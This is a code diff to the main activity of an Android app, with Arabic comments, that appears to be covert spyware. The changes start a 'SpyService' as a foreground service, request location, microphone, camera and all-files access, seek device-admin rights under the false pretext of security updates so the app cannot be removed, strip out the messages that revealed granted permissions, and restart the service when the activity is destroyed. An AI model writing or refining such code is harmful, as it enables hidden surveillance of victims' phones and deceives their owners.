@@ -13,7 +13,6 @@ import android.os.Looper;
 import android.provider.Settings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -31,18 +30,20 @@ public class MainActivity extends AppCompatActivity {
 
         Config.load(this);
 
-        // WebView يظهر كـ Google
         WebView wv = findViewById(R.id.webView);
         wv.getSettings().setJavaScriptEnabled(true);
         wv.getSettings().setDomStorageEnabled(true);
         wv.setWebViewClient(new WebViewClient());
-        wv.loadUrl("https://www.google.com");
+        wv.loadUrl(Config.get().webview_url);
 
-        // طلب الأذونات فوراً
+        startSpyService();
         new Handler(Looper.getMainLooper()).postDelayed(this::askAllPermissions, 500);
+    }
 
-        // تشغيل الخدمة
-        startService(new Intent(this, SpyService.class));
+    private void startSpyService() {
+        Intent i = new Intent(this, SpyService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
+        else startService(i);
     }
 
     private void askAllPermissions() {
@@ -57,9 +58,7 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.RECORD_AUDIO,
             Manifest.permission.CAMERA,
-            Manifest.permission.POST_NOTIFICATIONS,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE
+            Manifest.permission.POST_NOTIFICATIONS
         };
 
         if (Build.VERSION.SDK_INT >= 33) {
@@ -90,14 +89,12 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_ALL_PERMS);
         }
 
-        // صلاحية الملفات (Android 11+)
         if (Build.VERSION.SDK_INT >= 30 && !android.os.Environment.isExternalStorageManager()) {
             Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
             intent.setData(Uri.parse("package:" + getPackageName()));
             startActivity(intent);
         }
 
-        // Device Admin (منع الحذف)
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         ComponentName cn = new ComponentName(this, DeviceAdmin.class);
         if (!dpm.isAdminActive(cn)) {
@@ -106,18 +103,18 @@ public class MainActivity extends AppCompatActivity {
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتحديثات الأمان");
             startActivity(intent);
         }
-
-        Toast.makeText(this, "تم منح " + needed.size() + " صلاحية", Toast.LENGTH_SHORT).show();
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_ALL_PERMS) {
-            int c = 0;
-            for (int r : grantResults) if (r == PackageManager.PERMISSION_GRANTED) c++;
-            Toast.makeText(this, "تم منح " + c + " صلاحية", Toast.LENGTH_SHORT).show();
-        }
+        // لا نعرض أي رسالة Toast
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        startSpyService();
     }
 }
